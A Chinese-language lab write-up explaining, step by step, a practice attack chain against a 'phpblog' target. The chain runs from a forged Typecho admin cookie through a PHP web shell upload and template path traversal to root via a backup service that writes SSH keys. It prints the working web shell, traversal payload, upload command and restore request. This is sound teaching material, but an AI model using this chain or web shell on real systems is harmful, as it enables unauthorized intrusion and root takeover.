# phpblog 复现原理详解

这份文档不是替代 [复现指导.md](复现指导.md)，而是解释指导中的每一步：

- 命令在哪里执行；
- 命令把什么数据送到哪里；
- 服务端实际做了什么；
- 为什么会产生权限变化；
- 哪条输出能证明这一步成功。

## 1. 先建立整张图

不要一上来记 payload。先记住四个角色：

```text
Kali（你操作的机器）
  │ HTTP 请求
  ▼
phpblog 的 Apache + PHP-FPM（Web 服务，以 momo 用户运行）
  │ 读写文件、启动命令
  ▼
blogbackup.service（本机 root 服务）
  │ 以 root 复制文件
  ▼
/root/.ssh/authorized_keys（root 身份认证文件）
```

权限关系是：

| 角色 | 身份 | 能做什么 |
|---|---|---|
| Kali 中的你 | 攻击机普通用户 | 发 HTTP、运行 nmap、持有自己的 SSH 私钥 |
| Apache | Web 服务进程 | 接收请求、把请求交给 PHP-FPM |
| PHP-FPM `blog` pool | `momo` | 读写站点文件与 `/tmp` |
| `blogbackup.service` | `root` | 恢复文件、可写 root 控制面文件 |

整条链的本质不是“PHP 有一个漏洞”，而是：

```text
不可信输入
  → Web 用户获得文件写入与代码执行
  → Web 用户驱动 root 服务
  → 低权限用户借 root 服务完成高权限动作
```

这称为 **confused deputy（混淆代理）**：高权限程序替低权限用户执行操作，但没有正确判断
这个用户是否应该拥有该能力。

## 2. 每一步到底在验证什么

### 2.1 `ping` 和 `curl`：先确认“网络”和“应用”都活着

```bash
ping -c 2 192.168.56.101
```

`ping` 走 IP 网络层，回答的是：“我和靶机之间有没有基本连通性？”

```bash
curl -sSI http://192.168.56.101/
```

`curl` 走 HTTP 应用层，回答的是：“靶机上的 Web 服务是否正在监听 80 端口，并返回响应？”

常用参数：

| 参数 | 含义 |
|---|---|
| `-s` | 静默，不显示进度 |
| `-S` | 即使静默，也显示错误 |
| `-I` | 只请求响应头（HEAD） |
| `-b` | 发送 Cookie |
| `-F` | 构造 multipart 文件上传 |

如果 `ping` 通但 `curl` 不通，通常不是“漏洞没打通”，而是 Web 服务没启动、端口不对或被
防火墙拦住。先验证底层，再验证上层。

### 2.2 `nmap`：确认攻击面

```bash
nmap -sC -sV -p22,80 192.168.56.101
```

含义：

- `-p22,80`：只检查 22 和 80 端口；
- `-sV`：尝试识别服务和版本；
- `-sC`：运行默认脚本，例如 HTTP 标题、生成器、TLS 信息。

看到 `22/tcp OpenSSH` 和 `80/tcp Apache`，说明有两类入口：

1. SSH 是“远程登录”入口；
2. HTTP 是“Web 应用”入口。

这个阶段还不应该猜 payload，而是缩小到 Typecho Web 应用和它暴露的路由。

### 2.3 Typecho Cookie：为什么不用密码也能进后台

登录状态不是“服务器记得你这个人”，而是浏览器每次请求都带一段 Cookie。服务器用这段
Cookie 判断你是谁，类似进入活动后佩戴手环：

```text
登录成功 → 服务器发 Cookie
后续请求 → 浏览器自动把 Cookie 带回
```

Typecho 1.3.0 的关键点：

1. 数据库的 `typecho_users` 表有 `uid` 和 `authCode`；
2. Cookie 名带一个由站点 URL 计算出的 MD5 前缀；
3. `authCode` 经过 `Common::hash()` 后放入 Cookie；
4. 服务端再次计算并比较。

所以拿到数据库后，脚本不是“破解密码”，而是：

```text
读取 uid/authCode
  → 复现 Cookie 的拼接和 hash 规则
  → 构造服务端能接受的登录凭证
```

命令：

```bash
cd /path/to/2026-W45_LAB-phpblog/02_exploit
COOKIE=$(python3 forge_typecho_cookie.py \
  ../04_loot/blog.sqlite \
  http://192.168.56.101)
```

这里的 `$COOKIE` 是 Kali 当前 shell 中的一个变量，不是目标机上的文件。后面的 `curl -b "$COOKIE"`
只是把这个变量作为 Cookie 头发送。

成功判据：

```bash
curl -sS -b "$COOKIE" http://192.168.56.101/admin/ |
  grep '<title>'
```

如果标题是“网站概要”，说明服务器已经把你识别为 `momo` 管理员。

这不是纯黑盒步骤。数据库来源是前面的离线镜像审计；应把它如实记录为“借助源码/离线数据”
而不是“完全独立地从外部猜到密码”。

## 3. 文件上传与 Web Shell

### 3.1 `curl -F` 生成的是什么请求

```bash
curl -sS \
  -F 'draft=@phpblog_shell.php;filename=shell.php;type=application/x-php' \
  http://192.168.56.101/usr/themes/classic-22/submit/
```

`-F` 表示 multipart/form-data。它生成的请求包含三部分：

```text
draft 字段
  文件内容：@phpblog_shell.php
  客户端文件名：shell.php
  MIME：application/x-php
```

服务端处理逻辑：

```php
$dir = '/tmp/submissions';
$name = basename($file['name']);
$dest = $dir . '/' . $name;
move_uploaded_file($file['tmp_name'], $dest);
```

逐句解释：

1. 选择目标目录 `/tmp/submissions`；
2. 取客户端文件名，`basename()` 只去掉目录部分；
3. 拼出 `/tmp/submissions/shell.php`；
4. 把 PHP 临时上传文件移动到目标位置。

缺少什么：

- 没有扩展名白名单；
- 没有检查 PHP 内容；
- 没有随机文件名；
- 没有把上传目录隔离出 PHP 可读取范围。

### 3.2 Web Shell 为什么能执行

上传的代码：

```php
<?php
echo "PHPBLOG_RCE\n";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
```

逐句解释：

1. `<?php` 告诉 PHP 引擎“从这里开始执行代码”；
2. `echo` 输出固定标记，方便确认代码确实运行；
3. `$_GET['cmd']` 读取 URL 参数 `cmd`；
4. `system()` 把参数交给操作系统 shell。

如果直接在浏览器打开这个文件本身，服务器可能不会执行它，因为 `/tmp/submissions` 不是
Web 根目录。真正的执行发生在下一段：Typecho 主动 `require_once` 这个文件。

## 4. 模板路径穿越：`../` 为什么能跳出主题目录

Typecho 正常逻辑是：

```text
主题目录 /var/www/blog/usr/themes/classic-22/
加模板名 page.php
= /var/www/blog/usr/themes/classic-22/page.php
```

攻击者把模板名改成：

```text
../../../../../../tmp/submissions/shell.php
```

每一层 `../` 代表“回到上一级目录”：

```text
classic-22
  ../ → themes
  ../ → usr
  ../ → blog
  ../ → www
  ../ → var
  ../ → /

最后得到 /tmp/submissions/shell.php
```

PHP 的 `require_once` 会读取并执行这个文件，于是上传的 PHP 代码以 FPM 用户 `momo` 执行。

为什么它不是直接访问上传文件：

```text
直接访问 URL → Apache 只允许 Web 根目录内容
模板 require → PHP 代码正在访问本地文件系统
```

绕过的不是 Apache 的 URL 映射，而是 PHP 应用内部的路径校验。这个区别很重要。

页面创建、修改模板字段可以用后台，也可以用 Burp 拦截请求。关键判据不是“页面能打开”，
而是它执行了：

```text
PHPBLOG_RCE
uid=1000(momo) gid=1000(momo)
```

## 5. 为什么从“Web 用户”转向“本地服务”

拿到 `momo` 后，先不要直接找内核提权。先问：

1. 系统里有没有以 root 运行的服务？
2. 这个服务是否读取普通用户可写的文件？
3. 服务是否接收 HTTP、Unix socket、任务文件或配置？
4. 它最终写入哪些目录？

命令：

```bash
ps -eo user,pid,args | grep '[b]logbackup'
```

| 部分 | 作用 |
|---|---|
| `ps` | 查看进程 |
| `-e` | 所有进程 |
| `-o user,pid,args` | 只显示用户、PID、完整命令行 |
| `grep '[b]logbackup'` | 过滤进程名；方括号技巧避免 grep 匹配自身 |

看到：

```text
root ... /opt/blogbackup/agent.py --token <TOKEN> --listen 127.0.0.1:9001
```

说明两件事：

- Python 服务以 `root` 身份运行；
- token 被作为命令行参数暴露，`momo` 可以读取。

### 5.1 为什么必须在靶机内部访问 `127.0.0.1`

服务绑定的是 `127.0.0.1:9001`，意思是“只接受本机连接”。从 Kali 访问
`http://127.0.0.1:9001` 会访问 Kali 自己，不是靶机。

因此正确顺序是：

```text
Kali
  → HTTP 请求到靶机 80
  → momo Web Shell 在靶机内部执行 curl
  → curl 访问靶机自己的 127.0.0.1:9001
```

这就是为什么命令出现在 `cmd=` 里，而不是直接在 Kali 命令行里执行。

### 5.2 目录权限说明了什么

```text
drwxrwsr-x root:momo /var/lib/blogbackup/jobs
drwxrwsr-x root:momo /var/lib/blogbackup/staging
```

`root:momo` 表示文件所有者是 root，所属组是 momo；`rwxrwx` 中的组位允许 `momo` 组写入。
服务读取这些目录时，实际权限来源变成了 root。低权限用户只需要“放文件”，不需要“写 root 文件”。

## 6. 恢复任务的三部分

### 6.1 公钥与私钥

SSH 登录不是把密码发给服务器，而是用私钥完成数学签名：

```text
~/.ssh/phpblog_lab_ed25519       私钥，只留在自己的机器
~/.ssh/phpblog_lab_ed25519.pub   公钥，可以放到目标 authorized_keys
```

服务把公钥写入 `/root/.ssh/authorized_keys` 后，root SSH 才会认可持有对应私钥的人。

使用 `ls -la ~/.ssh` 时，`known_hosts` 和 `agent` 都不能代替密钥：

- `known_hosts` 记录你访问过哪些 SSH 服务器的公钥指纹，用于防中间人；
- `agent` 是 SSH agent 的 UNIX socket 目录；
- 只有在 `authorized_keys` 中登记过的公钥，以及与其配对的私钥，才能完成认证。

### 6.2 job 文件是“任务说明”

```json
{
  "id": "audit-root-key",
  "source": "/var/lib/blogbackup/staging/audit-root-key",
  "dest": "/root/.ssh/authorized_keys",
  "schedule": "manual"
}
```

逐字段：

- `id`：任务名，服务用它找 `audit-root-key.json`；
- `source`：要复制哪个 staging 文件；
- `dest`：复制到哪里；
- `schedule`：本靶机只是展示字段，真正触发是 HTTP `/restore`。

### 6.3 Base64 不是为了加密

Web Shell 的参数是 URL 中的 `cmd=`。如果直接把 JSON、公钥和换行放进去，容易出现：

- 引号被 PHP 或 shell 解释；
- 换行被 HTTP 编码破坏；
- 空格被截断。

Base64 把任意文本变成只包含安全字符的字符串，接收端再解码：

```text
原文件文字 → base64 编码 → HTTP 参数 → 目标端 base64 -d → 原文件文字
```

它不是安全机制，只是传输编码。

### 6.4 `/restore` 请求

```bash
curl -X POST \
  -H 'Content-Type: application/json' \
  --data '{"id":"audit-root-key"}' \
  'http://127.0.0.1:9001/restore?token=<TOKEN>'
```

服务端步骤：

1. 检查 token；
2. 读取 `jobs/audit-root-key.json`；
3. 检查 source 是否在 staging；
4. 检查 dest 是否在允许列表；
5. 以 root 打开 source 和 dest；
6. 复制内容；
7. `fchown(0, 0)` 设为 root:root；
8. 返回 `200` JSON。

`{"ok":true}` 只证明文件恢复成功，不自动证明 SSH 可登录。还要用私钥实际验证
`id` 是否返回 `uid=0(root)`。

## 7. 逐行理解一键脚本

[exploit_blogbackup.sh](02_exploit/privesc/exploit_blogbackup.sh) 不是魔法，核心只是把前面
的人工步骤自动化：

1. 检查三个参数是否齐全；
2. 检查公钥文件非空；
3. 把 job JSON、公钥和 `/restore` body 各自做 Base64；
4. 拼接成一条在靶机内部执行的命令；
5. 用 `curl --get --data-urlencode` 把命令安全送进 Web Shell；
6. 目标端写 job、写 staging，再请求本机 `/restore`。

脚本里的 `<TOKEN>` 必须替换成当前进程看到的真实值。重启服务后 token 会变化，必须重新查。

## 8. 成功链与失败链

```text
成功链：
HTTP 80 可达
  → 上传文件成功
  → PHP 被 require
  → momo 可执行命令
  → token 正确
  → job 与 staging 可写
  → restore 200
  → SSH 公钥认证成功
  → root
```

常见失败链：

```text
上传成功，但页面没有 RCE
  → 文件没有落到预期目录，或模板路径错误，或 PHP 不允许访问 /tmp

页面 RCE，但 9001 401
  → token 过期、复制错误、服务重启后 token 改变

restore 200，但 SSH 失败
  → 公钥为空、私钥不匹配、authorized_keys 被恢复服务覆盖、SSH 配置不支持 root key
```

## 9. 最小知识地图

这道题需要的不是“会背很多命令”，而是四个基础模型：

### 网络模型

IP 层可达不等于应用层可用；`127.0.0.1` 永远指当前机器自己。

### Web 模型

HTTP 请求由方法、路径、请求头、Cookie、body 组成。上传只是 body 的一种格式，认证只是
请求头的一种状态。

### 操作系统模型

进程有用户身份；文件有 owner/group/mode；root 服务读取低权限用户的文件时，会以 root
身份完成后续写入。

### 数据流模型

漏洞不是一个孤立字符串，而是：

```text
请求参数
  → 应用变量
  → 数据库字段
  → 文件路径
  → require / 系统命令
```

只要能把这条路径画出来，你就能从“照抄 WP”过渡到“看到源码知道该检查哪里”。

## 10. 复现时的正确阅读顺序

建议每次操作都按五问执行：

1. **我在哪台机器上执行？** Kali、靶机 `momo` 还是靶机 `root`？
2. **这条命令的输入是什么？** 文件名、URL、Cookie、token 或 JSON？
3. **服务端会把输入交给谁？** Apache、PHP-FPM、blogbackup 还是 SSH？
4. **成功输出应该是什么？** HTTP 200、`uid=1000(momo)`、`{"ok":true}` 还是 `uid=0(root)`？
5. **失败时，最小检查点是什么？** 不看一大段日志，先检查上一层是否仍然成立。

如果某一步只能回答“WP 让我这样做”，说明还没完成理解；把这条命令代入上面的五问，
再去 WP 的对应章节找数据流即可。
